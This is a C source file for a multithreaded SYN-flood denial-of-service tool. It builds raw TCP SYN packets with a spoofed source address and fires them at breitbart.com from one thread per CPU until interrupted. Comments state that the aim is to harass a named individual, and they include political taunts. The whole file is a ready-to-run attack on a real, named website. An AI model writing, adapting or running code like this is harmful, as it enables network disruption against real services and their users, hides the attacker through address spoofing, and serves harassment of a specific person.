// basics
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>

// network stuff
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>

// signal handling
#include <signal.h> 

// multithreading / timing
#include <pthread.h>
#include <time.h>

// different flavors of IP header
#ifdef __APPLE__
typedef struct ip iph_t;
#else
typedef struct iphdr iph_t; 
#endif

// calculate header checksum
unsigned short csum (unsigned short *ptr, int nbytes);

// get an IP address for a hostname
in_addr_t getip (char *hostname);

int get_socket (void);

// all of the dirty TCP / IP packet initialization in one amazing function
void dgram_init (char *source_host, char *destination_host);

// threading stuff
void start_threads (void);
void wait_for_interrupt (void);
void* thread_go (void *arg);

// handle a termination signal
void onsignal(int sig);

struct s_thread_data {
    volatile int stop;      // flag to terminate program
    int nthreads;           // number of threads
    pthread_t *threads;     // threads
};

struct s_packet_data {
    struct sockaddr_in addr;
    size_t ip_len;
    char datagram[4096];
};


// global variables. such design
struct s_thread_data thread_data;
struct s_packet_data packet_data;
time_t tstart;


/**
 * main function
 * accepts no arguments. starts up one thread per CPU to fire SYN packets off to
 * the host for "breitbart.com" as fast as humanly possible. the point is to 
 * harrass stephen bannon.
 *
 * just run it and hit CTRL+C to quit
 */
int main (void)
{   

    // If they don't like being harrassed online they can just "log off" :)
    // http://www.breitbart.com/tech/2015/12/08/birth-control-makes-women-unattractive-and-crazy/
    // http://www.breitbart.com/milo/2016/07/05/solution-online-harassment-simple-women-log-off/
    dgram_init ("trump.com",    // source hostname 
                "breitbart.com" // destination hostname
               );

    // run
    start_threads ();

    // wait for signal
    wait_for_interrupt ();

    printf("Done\n");
}

/**
 * open a raw socket
 */
int get_socket (void) {
     //Create a raw socket
    int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s == -1) {
        if (errno == EPERM) {
            fprintf (stderr, "Cannot open raw socket as non root user\n");
        } else {
            perror ("Unable to open socket");
        }
        
        exit (errno);
    }
    
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror ("Error setting IP_HDRINCL");
        exit (errno);
    }

    return s;
}


//needed for checksum calculation
struct checksum_header
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
     
    struct tcphdr tcp;
};


/**
 * sets up TCP / IP headers for SYN packet. the intention is to call once and 
 * re-use the packet. this is where most of the cross-platform stuff lives 
 */
void dgram_init (char *source_host, char *destination_host) {
    
    // spoof source ip
    in_addr_t source_ip = getip(source_host);

    //IP header
    iph_t *iph = (iph_t *) packet_data.datagram;

    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) 
                          (packet_data.datagram + sizeof (struct ip));
    struct checksum_header csh;
    
    packet_data.addr.sin_family = AF_INET;
    packet_data.addr.sin_port = htons(8000);

    packet_data.addr.sin_addr.s_addr = getip(destination_host);
    memset (packet_data.datagram, 0, 4096);
     
    //IP Header
#ifdef __APPLE__
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->ip_id = htons(54321);  //Id of this packet
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;      //Set to 0 before calculating checksum
    iph->ip_src.s_addr = source_ip;
    iph->ip_dst.s_addr = packet_data.addr.sin_addr.s_addr;
     
    iph->ip_sum = csum ((unsigned short *) packet_data.datagram, 
                        iph->ip_len >> 1);

#else
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = source_ip;
    iph->daddr = packet_data.addr.sin_addr.s_addr;
     
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
#endif
     
    //TCP Header
#ifdef __APPLE__
    tcph->th_sport = htons (1234);
    tcph->th_dport = htons (80);
    tcph->th_seq = 0;
    tcph->th_ack = 0x0;
    tcph->th_x2 = 0x0;
    tcph->th_off = 5;               // first and only tcp segment
    tcph->th_flags = TH_SYN;        // SYN
    tcph->th_win = htons (65535);   // max window size
    tcph->th_sum = 0x0;             // IP stack fills this in
    tcph->th_urp = 0x0;
    tcph->th_sum = 0;
#else 
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;                 // first and only tcp segment
    tcph->fin=0;
    tcph->syn=1;                    // SYN
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (65535);   // maximum allowed window size
    tcph->check = 0;                // IP stack fills this in
    tcph->urg_ptr = 0;
#endif
     
    //Now the IP checksum
    csh.source_address = source_ip;
    csh.dest_address = packet_data.addr.sin_addr.s_addr;
    csh.placeholder = 0;
    csh.protocol = IPPROTO_TCP;
    csh.tcp_length = htons(20);
    memcpy(&csh.tcp , tcph , sizeof *tcph);
     
#ifdef __APPLE__
    tcph->th_sum = csum( (unsigned short*) &csh , sizeof csh);
#else
    tcph->check = csum( (unsigned short*) &csh , sizeof csh);
#endif

    // set ip_len
    packet_data.ip_len =
#ifdef __APPLE__
    iph->ip_len;
#else
    iph->tot_len;   
#endif
}


/**
 * calculate checksum from some arbitrary string of bytes
 */
unsigned short csum (unsigned short *ptr,int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}


/**
 * get an IP address for a hostname
 */
in_addr_t getip (char *hostname) {

    printf("Looking up host %s...\n", hostname);
    struct hostent *he;
    struct in_addr **addr_list;

    if ( (he = gethostbyname (hostname)) ) {
        // DNS lookup success!
        addr_list = (struct in_addr**) he->h_addr_list;
        if (addr_list[0]) {
            printf ("IP address for %s: %s\n", 
                    hostname, 
                    inet_ntoa (*addr_list[0]));
            return addr_list[0]->s_addr;
        } else {
            // lookup succeeded but 0 IP addresses?
            fprintf (stderr, "No IP address for %s\n", hostname);
        }
    } else {
        // lookup failed
        fprintf (stderr, "DNS lookup failed for %s\n", hostname);
    }

    exit (1);
}


/**
 * start the threads. attempts to detect number of processors to start 1 per 
 * core. if that fails, it just starts 1 thread
 */
void start_threads (void) {
    int np = sysconf (_SC_NPROCESSORS_ONLN);
    // _SC_NPROCESSORS_ONLN is a nonstandard posix extension
    // may fail, return -1
    // however it supposedly works on Mac, Cygwin
    if (np <= 0) {
        printf ("Unable to detect CPU count. Setting to 1\n");
        np = 1;
    }

    thread_data.threads = malloc (np * sizeof (pthread_t));
    if (!thread_data.threads) {
        fprintf (stderr, "Out of memory!\n");
        exit (1);   
    }

    thread_data.stop = 0;

    tstart = time (NULL);
    for (int i = 0; i < np; ++i) {
        pthread_attr_t attrs;  
        pthread_attr_init(&attrs);
        pthread_attr_setdetachstate(&attrs, PTHREAD_CREATE_JOINABLE);
        pthread_create (&thread_data.threads[i], &attrs, thread_go, NULL);
    }

    printf ("Started %d threads\n", np);
    thread_data.nthreads = np;
}


/**
 * execute the attack in a thread
 * each thread gets a socket, but reuses the SYN packet
 * returns the number of packets successfully sent
 */
void* thread_go (void *arg) {
    int s = get_socket ();
    uint64_t count = 0;
    uint64_t buf_err_count = 0;
    uint64_t retry_count = 10;
    int sleep_usec = 50000;

    while (!thread_data.stop) {
        if (sendto (s,                  // socket 
                    packet_data.datagram,
                    packet_data.ip_len, // total length of datagram
                    0,                  // routing flags
                    (struct sockaddr *) &packet_data.addr, 
                    sizeof (packet_data.addr)) < 0)
        {
            if (errno == ENOBUFS) {
                // ran out of buffer
                // wait a little and retry
                ++buf_err_count;

                // also, try to adjust sleep_usec
                if (count > 0) {
                    double buf_err_rate = (double) buf_err_count / count;
                    if (buf_err_rate > 0.001 && sleep_usec < 500000) {
                        sleep_usec *= 1.5;
                        printf ("sleep_usec set to %d\n", sleep_usec);
                    } else if (buf_err_rate < 0.0001 && sleep_usec > 10000) {
                        sleep_usec /= 1.5;
                        printf ("sleep_usec set to %d\n", sleep_usec);
                    }
                }

                usleep (sleep_usec);
            } else {
                if (retry_count-- <= 0) {
                    perror ("sendto() failed");
                    break;
                }
            }
        } else {
            // success
            retry_count = 0;
            ++count;   
        }
    }

    return (void*) count;
}


/**
 * block until an interrupt signal is received. then, print out some runtime 
 * info.
 */
void wait_for_interrupt (void) {

    signal (SIGINT, onsignal);
    signal (SIGTERM, onsignal);
    
    // wait for each thread, then collect its count
    uint64_t count = 0;
    for (int i = 0; i < thread_data.nthreads; ++i) {
        void *retval;
        pthread_join (thread_data.threads[i], &retval);
        count += * (uint64_t*) (&retval);
    }

    // just do time in seconds. not too accurate if you don't run it very long
    time_t exec_time = time (NULL) - tstart;
    if (exec_time == 0) {
        exec_time = 1;
    }
    uint64_t packets_per_sec = count / exec_time;

    // print number of sent packets and packets per second
    printf ("Sent "
#ifdef __APPLE__
        // mac: complains if not formatted as unsigned long long 
        "%llu packets (%llu"
#else 
        // linux: complains if not formatted long unsigned
        "%lu packets (%lu"
#endif
        " packets / second)\n", count, packets_per_sec);
}


/**
 * executed when a termination signal is received. sets the stop flag so that 
 * threads know its time to shut down
 */
void onsignal (int sig) {
    printf ("Shutting down\n");
    thread_data.stop = 1;   // tells running threads to stop
}

